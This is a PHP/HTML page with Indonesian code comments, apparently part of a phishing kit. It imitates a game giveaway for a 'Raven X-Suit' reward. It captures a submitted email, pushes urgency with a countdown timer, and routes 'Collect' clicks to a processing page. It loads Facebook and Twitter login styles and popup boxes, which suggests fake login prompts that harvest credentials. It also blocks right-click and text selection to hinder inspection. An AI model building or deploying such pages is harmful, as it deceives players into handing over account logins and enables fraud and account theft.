<?php
// MENGAMBIL KONTROL
include 'system/setting.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<style type="text/css">
#collect fieldset:not(:first-of-type) {
display: none;
}
.popup-login {
	background:rgba(0,0,0,0.5);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:350px;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	position:absolute;
	top:-8px;
	right:-10px;
	display:block;
}
.close-fb i {
	color:#fff;
	padding-top:1px;
}
.close-other {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	top:-8px;
	right:-10px;
	position:absolute;
	z-index:9999999;
	display:block;
}
.close-other i {
	color:#fff;
	padding-top:1px;
}
@media only screen and (max-width:600px) {
	.popup-box-login-fb {
		margin-top: 4%;
	}
}
</style>
  
<div class="container">
<div class="header"></div>

<div class="box">
<center>
<div class="menu active" onmousedown="buka.play()" onclick="openHero(event, 'latest');" id="defaultOpen">Raven X-Suit</div>
<div class="alert">
Get yours now Rewards! New Blood Raven X-Suit!
<br>
before being left behind!
<div class="alert-time" id="timer1"></div>
</div>
</center>

<div id="latest" class="gallery">
<div class="scroll">
<center>
<div class="item">
<img src="img/rewards/1.png">
<div>
<button style="border-top: 0px;" onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/rewards/2.png">
<div>
<button style="border-top: 0px;" onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/rewards/3.png">
<div>
<button style="border-top: 0px;" onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/rewards/4.png">
<div>
<button style="border-top: 0px;" onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/rewards/5.png">
<div>
<button style="border-top: 0px;" onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/rewards/6.png">
<div>
<button style="border-top: 0px;" onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
</center>
</div>
</div>


</div>
</div>
</div>


</div> <!--- box --->
</div> <!--- container --->

<div class="popup collect" style="display: none;">
<div class="popup-box animated fadeInDown">
<a onclick="closepopup()" onmousedown="tutup.play()" class="close"><i class="zmdi zmdi-close-circle"></i></a>
<div class="nav-popup"><div class="nav-popup-title">Reward Confirmation</div></div>
<div class="alert">Are you sure to collect this prize?</div>
<div class="popup-confirm">
<i class="fa fa-question-circle"></i>
</div>
<br>
<button type="button" class="btn-anjir" onmousedown="buka.play()" onclick="location.href='processing.php';" class="next">Collect</button>
</div>
</div>

<!--- fieldset content --->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<!--- /fieldset content --->
<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script src="js/timer.js"></script>
<script src="js/tab.js"></script>
<script src="js/popup.js"></script>
<script src="js/fieldset.js"></script>
<script src="js/click.js"></script>

</body>
</html>